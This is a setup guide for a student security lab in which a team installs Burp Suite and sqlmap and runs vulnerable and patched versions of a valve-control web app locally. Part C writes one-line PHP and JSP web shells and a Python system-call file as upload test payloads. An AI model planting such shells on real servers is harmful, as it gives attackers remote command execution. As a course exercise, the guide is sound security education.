# Step 1: Setup and Preparation

**Time Required:** 2 hours  
**Who:** All 3 team members together  
**Goal:** Get all tools installed and verify the application works

## Part A: Install Required Tools

### 1. Install Burp Suite Community Edition

**macOS:**
```bash
brew install --cask burp-suite
```

**Or download from:** https://portswigger.net/burp/communitydownload

**Verify installation:**
- Open Burp Suite
- Click "Next" through setup wizard
- Select "Temporary project"
- Click "Use Burp defaults"
- You should see the Burp Suite dashboard

### 2. Install sqlmap

**Option A - Using pip:**
```bash
pip3 install sqlmap-tool
```

**Option B - Using git:**
```bash
cd ~/Desktop
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version
```

**Verify:**
```bash
sqlmap --version
```
Should see: "sqlmap/1.x.x"

### 3. Install OBS Studio (for video recording)

**macOS:**
```bash
brew install --cask obs
```

**Or download from:** https://obsproject.com/download

**Configure OBS:**
1. Open OBS
2. Go through auto-configuration wizard
3. Choose "Optimize for recording"
4. Set output resolution: 1920x1080
5. Set recording format: MP4

### 4. Verify Docker is Running

```bash
docker --version
docker-compose --version
```

Should see versions displayed. If not:
```bash
brew install --cask docker
```
Then start Docker Desktop from Applications.

## Part B: Verify Application Works

### 1. Start Both Applications

```bash
cd /Users/azuolasbalbieris/Documents/Academic/Cybersecurity/task_5_CS437
docker-compose up --build
```

**Expected output:**
```
Creating network "task_5_cs437_default" with the default driver
Building vulnerable_app...
Building patched_app...
...
vulnerable_app_1  | * Running on http://0.0.0.0:5002
patched_app_1     | * Running on http://0.0.0.0:5001
```

**If you see errors:**
- Check if ports 5001/5002 are already in use
- Try: `docker-compose down` then `docker-compose up --build`
- Check Docker Desktop is running

### 2. Test Vulnerable Version

**Open browser:** http://localhost:5002

**You should see:**
- Login page with "Remote Valve Management System" title
- Two login forms (Admin and Operator)
- Clean, professional UI

**Login as admin:**
- Username: `admin`
- Password: `admin123`

**After login, you should see:**
- Dashboard with valve grid
- 150 valves displayed
- Each valve shows: name, location, status, percentage
- Navigation menu with: Dashboard, Valves, Upload, Logs, Monitoring

**Test each page:**

1. **Dashboard** (/)
   - Grid of valves
   - Can click "Control" button
   - Can issue commands

2. **Valves** (/valves)
   - Full list view
   - Search box at top
   - Filter controls

3. **Upload** (/upload)
   - Should see 3 scenarios:
     - Scenario 1: Firmware Upload (No Protection)
     - Scenario 2: Config Upload (Weak Protection)
     - Scenario 3: Encrypted Upload (Scan Bypass)

4. **Logs** (/logs)
   - Shows command execution logs
   - Shows valve events
   - Shows failed operations

5. **Monitoring** (/monitoring)
   - Attack dashboard
   - May be empty initially
   - Will fill up during testing

### 3. Test Patched Version

**Open new browser tab:** http://localhost:5001

**Repeat same tests:**
- Login with same credentials
- Verify all pages load
- Interface should look identical to vulnerable version

**Key difference:** Upload and search functionality will reject malicious inputs.

### 4. Test Login with Operator Account

**Logout** (click Logout in top menu)

**Login as operator:**
- Username: `operator`
- Password: `operator123`

**Verify:**
- Can see dashboard
- Can control valves
- Can search valves
- Has limited permissions (no user management)

## Part C: Create Testing Workspace

### 1. Create Screenshot Folder

```bash
cd /Users/azuolasbalbieris/Documents/Academic/Cybersecurity/task_5_CS437
mkdir -p testing_results/screenshots
mkdir -p testing_results/burp_captures
mkdir -p testing_results/sqlmap_outputs
mkdir -p testing_results/monitoring_logs
mkdir -p testing_results/tool_outputs
```

### 2. Create Testing Log File

```bash
touch testing_results/testing_log.md
```

**Add initial content:**
```markdown
# Testing Log - CS437 Task 5

## Team Members
- Person 1:
- Person 2:
- Person 3:

## Testing Date
Started: [DATE]

## Test Environment
- Vulnerable App: http://localhost:5002
- Patched App: http://localhost:5001
- OS: macOS
- Docker version:
- Python version:

## Tests Completed
- [ ] Burp Suite - Upload Scenario 1
- [ ] Burp Suite - Upload Scenario 2
- [ ] Burp Suite - Upload Scenario 3
- [ ] Burp Suite - SQL Injection
- [ ] sqlmap - As Admin (vulnerable)
- [ ] sqlmap - As Operator (safe)
- [ ] sqlmap - Patched version
- [ ] Manual curl tests
- [ ] Monitoring dashboard verification

## Notes
```

### 3. Prepare Test Files

Create some test files we'll use for exploitation:

```bash
cd testing_results
mkdir test_files

echo '<?php system($_GET["cmd"]); ?>' > test_files/malicious.php
echo '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' > test_files/malicious.jsp
echo 'import os; os.system("whoami")' > test_files/malicious.py
echo 'malicious binary content here' > test_files/test.bin
dd if=/dev/zero of=test_files/oversized.bin bs=1m count=10
```

**Verify files created:**
```bash
ls -lh test_files/
```

You should see:
- malicious.php (34 bytes)
- malicious.jsp (90 bytes)
- malicious.py (32 bytes)
- test.bin (29 bytes)
- oversized.bin (10 MB)

## Part D: Configure Browser for Burp Suite

### 1. Setup Firefox (Recommended)

**Why Firefox?** Easier to configure proxy separately from system settings.

**Download Firefox:** https://www.mozilla.org/firefox/download/

**Configure proxy:**
1. Open Firefox
2. Go to Settings (⚙️)
3. Scroll to "Network Settings"
4. Click "Settings..."
5. Select "Manual proxy configuration"
6. HTTP Proxy: `127.0.0.1`
7. Port: `8080`
8. Check "Also use this proxy for HTTPS"
9. Click OK

### 2. Install Burp Certificate in Firefox

1. Start Burp Suite
2. Go to Proxy → Intercept (turn intercept OFF for now)
3. In Firefox, visit: http://burp
4. Click "CA Certificate" in top-right
5. Save burp.der file
6. Firefox Settings → Privacy & Security
7. Scroll to "Certificates" → View Certificates
8. Import burp.der
9. Check "Trust this CA to identify websites"
10. Click OK

**Test:**
- Open Firefox
- Visit http://localhost:5002
- You should see login page
- Check Burp Suite → Proxy → HTTP history
- You should see the HTTP request

### 3. Alternative: Configure Safari/Chrome

**Safari:**
```bash
System Preferences → Network → Advanced → Proxies
Check "Web Proxy (HTTP)" and "Secure Web Proxy (HTTPS)"
Server: 127.0.0.1
Port: 8080
```

**Chrome:** Uses system proxy settings (same as Safari on macOS)

## Part E: Get Session Cookies

You'll need session cookies for command-line testing.

### 1. Get Admin Session Cookie

1. Open Firefox (with Burp proxy enabled)
2. Go to http://localhost:5002
3. Login as admin/admin123
4. Press F12 (Developer Tools)
5. Go to "Storage" tab
6. Click "Cookies" → "http://localhost:5002"
7. Find "session" cookie
8. Copy the Value (long string)

**Save it:**
```bash
echo 'ADMIN_SESSION=your_session_value_here' >> testing_results/session_cookies.txt
```

### 2. Get Operator Session Cookie

1. Logout
2. Login as operator1/operator123
3. Get session cookie same way
4. Save it:

```bash
echo 'OPERATOR_SESSION=your_session_value_here' >> testing_results/session_cookies.txt
```

### 3. Get Patched Version Session Cookies

Repeat for http://localhost:5001 (both admin and operator).

```bash
echo 'PATCHED_ADMIN_SESSION=your_session_value_here' >> testing_results/session_cookies.txt
echo 'PATCHED_OPERATOR_SESSION=your_session_value_here' >> testing_results/session_cookies.txt
```

## Part F: Verification Checklist

Before proceeding to testing, verify:

**Tools:**
- [ ] Burp Suite opens and starts
- [ ] sqlmap command works
- [ ] Docker is running
- [ ] OBS Studio opens

**Applications:**
- [ ] Vulnerable app runs on port 5002
- [ ] Patched app runs on port 5001
- [ ] Can login as admin on both
- [ ] Can login as operator on both
- [ ] All pages load without errors
- [ ] Monitoring dashboard accessible

**Testing Setup:**
- [ ] Created testing_results folder structure
- [ ] Created test files (malicious.php, etc.)
- [ ] Firefox configured with Burp proxy
- [ ] Burp certificate installed in Firefox
- [ ] Can see HTTP requests in Burp
- [ ] Have session cookies saved

**Team Coordination:**
- [ ] All 3 members have tools installed
- [ ] Everyone can access the applications
- [ ] Shared folder for screenshots (Dropbox/Drive)
- [ ] Communication channel setup (Discord/Slack)

## Troubleshooting

**"Port 5002 already in use":**
```bash
docker-compose down
lsof -ti:5002 | xargs kill -9
docker-compose up --build
```

**"Burp not intercepting HTTPS":**
- Make sure certificate is installed
- Try visiting http:// not https://
- Check proxy settings are correct

**"Cannot login to application":**
- Check browser console for errors (F12)
- Try clearing cookies
- Restart Docker containers

**"sqlmap not found":**
```bash
pip3 install sqlmap-tool
# or use:
python3 /path/to/sqlmap/sqlmap.py
```

**"Permission denied on test files":**
```bash
chmod 644 testing_results/test_files/*
```

## Next Steps

**Once everything above is verified, proceed to:**
→ **02_BURP_SUITE_TESTING.md**

**Estimated time for next step:** 4-5 hours
